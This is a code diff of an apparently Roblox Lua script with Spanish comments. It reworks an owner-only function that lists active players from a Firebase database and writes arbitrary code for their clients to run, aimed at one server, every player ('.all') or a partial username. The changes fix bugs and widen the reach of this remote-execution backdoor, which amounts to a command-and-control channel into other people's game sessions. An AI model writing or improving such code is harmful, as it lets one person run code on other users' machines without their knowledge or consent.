@@ -2140,13 +2140,17 @@ local cmdKey = tostring(os.time()) .. "_" .. myUserId
         end)
 
 if isOwner then
+            -- ✅ FUNCIÓN ÚNICA Y CORREGIDA
             local function ExecuteRemoteCode(code, target)
                 if code == "" then return end
                 target = (target or ".s"):gsub("^%s+", ""):gsub("%s+$", "")
-                local execKey = tostring(os.time()) .. "_exec_" .. myUserId
-                local sentCount = 0
+
+                executeBtn.Text = "⏳ Buscando jugadores..."
+                executeBtn.BackgroundColor3 = Color3.fromRGB(255, 170, 50)
 
                 local hearts = firebaseRequest("GET", "/heartbeats")
+
+                -- ✅ Bug fix: verificar que hearts sea tabla válida
                 if not hearts or type(hearts) ~= "table" then
                     executeBtn.Text = "❌ Sin jugadores detectados"
                     executeBtn.BackgroundColor3 = Color3.fromRGB(220, 80, 80)
@@ -2157,113 +2161,77 @@ if isOwner then
                 end
 
                 local now = os.time()
-
-                for uid, p in pairs(hearts) do
-                    -- ✅ Ignorar claves no numéricas como "error"
-                    if type(p) ~= "table" then continue end
-                    if tonumber(uid) == nil then continue end
-                    if tostring(uid) == tostring(myUserId) then continue end
-                    if (now - (p.timestamp or 0)) > 120 then continue end
-
-                    local matchServer = tostring(p.server_id or "") == tostring(currentServerId)
-                    local matchName = (p.username or ""):lower() == target:lower()
-
-                    local shouldSend = false
-                    if target == ".s" or target == "" then
-                        shouldSend = matchServer
-                    elseif target == ".all" then
-                        shouldSend = true
-                    else
-                        shouldSend = matchName
-                    end
-
-                    if shouldSend then
-                        pcall(function()
-                            firebaseRequest("PUT", "/executions/" .. tostring(uid) .. "/" .. execKey, {
-                                sender_id = myUserId,
-                                code      = code,
-                                timestamp = os.time()
-                            })
-                        end)
-                        sentCount += 1
-                    end
-                end
-
-                if sentCount > 0 then
-                    executeBtn.Text = "✓ Enviado a " .. sentCount .. " jugadores"
-                    executeBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 140)
-                else
-                    executeBtn.Text = "⚠️ Nadie encontrado"
-                    executeBtn.BackgroundColor3 = Color3.fromRGB(255, 170, 50)
-                end
-                task.wait(2)
-                executeBtn.Text = "▶ Ejecutar"
-                executeBtn.BackgroundColor3 = Color3.fromRGB(67, 181, 129)
-            end
-
-            local function ExecuteRemoteCode(code, target)
-                if code == "" then return end
-                target = (target or ".s"):gsub("^%s+", ""):gsub("%s+$", "")
-                local execKey = tostring(os.time()) .. "_exec_" .. myUserId
                 local sentCount = 0
+                local execKey = tostring(os.time()) .. "_exec_" .. myUserId
 
-                local hearts = firebaseRequest("GET", "/heartbeats")
-                if not hearts or type(hearts) ~= "table" then
-                    executeBtn.Text = "❌ Sin jugadores detectados"
-                    executeBtn.BackgroundColor3 = Color3.fromRGB(220, 80, 80)
-                    task.wait(2)
-                    executeBtn.Text = "▶ Ejecutar"
-                    executeBtn.BackgroundColor3 = Color3.fromRGB(67, 181, 129)
-                    return
-                end
-
-                local now = os.time()
+                -- ✅ Bug fix: normalizar currentServerId para comparación
+                local myServerIdStr = tostring(currentServerId or "")
 
                 for uid, p in pairs(hearts) do
-                    -- ✅ Ignorar claves no numéricas como "error"
+                    -- ✅ Ignorar entradas inválidas
                     if type(p) ~= "table" then continue end
-                    if tonumber(uid) == nil then continue end
+                    local numId = tonumber(uid)
+                    if not numId then continue end
+                    -- No enviarse a sí mismo
                     if tostring(uid) == tostring(myUserId) then continue end
+                    -- Solo jugadores activos (últimos 2 minutos)
                     if (now - (p.timestamp or 0)) > 120 then continue end
 
-                    local matchServer = tostring(p.server_id or "") == tostring(currentServerId)
-                    local matchName = (p.username or ""):lower() == target:lower()
+                    -- ✅ Bug fix: comparación robusta de server_id
+                    local pServerStr = tostring(p.server_id or "")
+                    local matchServer = (pServerStr ~= "" and pServerStr == myServerIdStr)
+                    local pName = tostring(p.username or ""):lower()
+                    local targetLower = target:lower()
 
                     local shouldSend = false
+
                     if target == ".s" or target == "" then
-                        shouldSend = matchServer
+                        -- ✅ Bug fix: si currentServerId está vacío, enviar a todos activos
+                        if myServerIdStr == "" then
+                            shouldSend = true
+                        else
+                            shouldSend = matchServer
+                        end
                     elseif target == ".all" then
                         shouldSend = true
                     else
-                        shouldSend = matchName
+                        -- Búsqueda por nombre parcial (mínimo 3 caracteres)
+                        if #targetLower >= 3 then
+                            shouldSend = pName == targetLower or pName:sub(1, #targetLower) == targetLower
+                        end
                     end
 
                     if shouldSend then
-                        pcall(function()
+                        local ok, err = pcall(function()
                             firebaseRequest("PUT", "/executions/" .. tostring(uid) .. "/" .. execKey, {
                                 sender_id = myUserId,
                                 code      = code,
                                 timestamp = os.time()
                             })
                         end)
-                        sentCount += 1
+                        if ok then
+                            sentCount += 1
+                        end
                     end
                 end
 
                 if sentCount > 0 then
-                    executeBtn.Text = "✓ Enviado a " .. sentCount .. " jugadores"
+                    executeBtn.Text = "✓ Enviado a " .. sentCount .. " jugador(es)"
                     executeBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 140)
                 else
-                    executeBtn.Text = "⚠️ Nadie encontrado"
+                    executeBtn.Text = "⚠️ Nadie encontrado (target: " .. target .. ")"
                     executeBtn.BackgroundColor3 = Color3.fromRGB(255, 170, 50)
                 end
-                task.wait(2)
+                task.wait(2.5)
                 executeBtn.Text = "▶ Ejecutar"
                 executeBtn.BackgroundColor3 = Color3.fromRGB(67, 181, 129)
             end
 
+            -- ✅ Conexión correcta (única, sin duplicados)
             executeBtn.MouseButton1Click:Connect(function()
-                ExecuteRemoteCode(codeInput.Text, targetInput.Text)
+                task.spawn(function()
+                    ExecuteRemoteCode(codeInput.Text, targetInput.Text)
+                end)
             end)
 
             clearBtn.MouseButton1Click:Connect(function()
